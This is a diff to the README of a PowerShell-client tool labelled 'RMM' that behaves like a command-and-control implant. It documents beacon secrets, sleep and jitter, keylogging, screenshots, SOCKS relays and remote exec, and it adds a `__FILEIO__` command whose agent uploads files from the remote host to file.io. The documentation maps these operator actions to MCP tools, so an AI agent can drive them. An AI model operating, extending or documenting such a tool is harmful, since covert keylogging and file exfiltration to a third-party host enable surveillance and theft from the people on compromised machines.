@@ -109,6 +109,7 @@ MCP tools mirror `rmm_cli.py` operator actions:
 | `set_sleep` / `set_jitter` / `config set-*` | `patch_config` |
 | `events` | `get_events` |
 | `download` | `queue_download` |
+| `fileio` | `queue_fileio` |
 | `upload` | `queue_upload` |
 | `screenshot` | `queue_screenshot` |
 | `socks list` | `list_socks` |
@@ -167,6 +168,7 @@ Beacon endpoints require `X-RMM-Beacon-Token: <RMM_BEACON_SECRET>` (or query `be
 | `POST` | `/sessions/{id}/exec` | `{"command":"…","timeout":120}` | Queue and **wait** for next result event |
 | `POST` | `/sessions/{id}/upload` | `{"remote_path":"…","content_b64":"…"}` | Queue `__UPLOAD__` |
 | `POST` | `/sessions/{id}/download` | `{"remote_path":"…"}` | Queue `__DOWNLOAD__` |
+| `POST` | `/sessions/{id}/fileio` | `{"remote_path":"…","expires":"14d"}` | Queue `__FILEIO__` (agent uploads to file.io; link in events) |
 | `POST` | `/sessions/{id}/screenshot` | — | Queue `__SCREENSHOT__` |
 | `GET` | `/socks` | — | List active SOCKS relays (`relays[]`: url, session, agent, channel) |
 | `POST` | `/sessions/{id}/socks` | `{"port":1080}` or `{"stop":true}` | Start/stop SOCKS5 on `127.0.0.1` via agent |
@@ -227,6 +229,7 @@ See sections below for command tokens and result types.
 | `__EXIT__` | Session killed — client exits |
 | `__STOP__` | Clear persistent command |
 | `__DOWNLOAD__ <path>` | Client uploads file (`type=file_upload`) |
+| `__FILEIO__ <path> [expires]` | Client uploads file to [file.io](https://www.file.io/) (`type=fileio_upload`; link in events) |
 | `__UPLOAD__ <path>` + newline + JSON | Client writes remote file |
 | `__SCREENSHOT__` | Screenshot PNG |
 | `__KEYLOG__ start\|stop\|dump` | Keylogger |
@@ -244,6 +247,7 @@ Queue the same tokens via `rmm_cli.py run` / `exec` or `POST …/commands`.
 |--------|------|
 | `output` (default) | JSON `{"rmm_cmd":"…","rmm_output":"…"}` or plain text |
 | `file_upload` | JSON with base64 `content` → `RMM_logs/downloads/` (large files sent in **6 MB chunks** with `offset` / `eof`; no fixed size cap) |
+| `fileio_upload` | JSON with `link`, `remote_path`, `success`, … (no local artifact; third-party file.io) |
 | `screenshot` | Base64 PNG → `RMM_logs/screenshots/` |
 | `keylog` | Text → `RMM_logs/keylogs/` |
 | `config_ack` | Logged / event stream |
@@ -287,6 +291,7 @@ Run **`python rmm_cli.py`** with no arguments for an **interactive console** (li
 | `config set-sleep <n>` | 1–3600 |
 | `config set-jitter <n>` | 0–100 |
 | `download <remote_path>` | Queue `__DOWNLOAD__` |
+| `fileio <remote_path> [--expires 1w]` | Queue `__FILEIO__` (file.io link in events) |
 | `upload <local> <remote>` | Queue `__UPLOAD__` |
 | `socks [port]` / `socks stop` | SOCKS5 on 127.0.0.1 via remote agent (default port 1080) |
 | `events` | Poll result events (`--since`, `--limit`) |
@@ -303,7 +308,7 @@ Same commands as before (`list`, `use`, `set_sleep`, shell commands, etc.). Pref
 
 ## Client (`client_rmm.ps1`)
 
-All settings live in a **configuration block at the top of the script** (`$u`, `$beaconSecret`, `$httpProxy`, …). Optional environment variables override those variables when set: `RMM_BASE_URL`, `RMM_BEACON_SECRET`, `RMM_HTTP_PROXY`, `RMM_HTTP_PROXY_USE_DEFAULT_CREDENTIALS`, `RMM_PERSISTENT_HTTP`, `RMM_VERBOSE`.
+All settings live in a **configuration block at the top of the script** (`$u`, `$beaconSecret`, `$httpProxy`, …). Optional environment variables override those variables when set: `RMM_BASE_URL`, `RMM_BEACON_SECRET`, `RMM_HTTP_PROXY`, `RMM_HTTP_PROXY_USE_DEFAULT_CREDENTIALS`, `RMM_PERSISTENT_HTTP`, `RMM_VERBOSE`, `RMM_FILEIO_MAX_BYTES` (default 100 MB cap before file.io upload).
 
 - **URL:** edit `$u` or set `RMM_BASE_URL`.
 - **Beacon secret:** edit `$beaconSecret` or set `RMM_BEACON_SECRET` (must match the server).
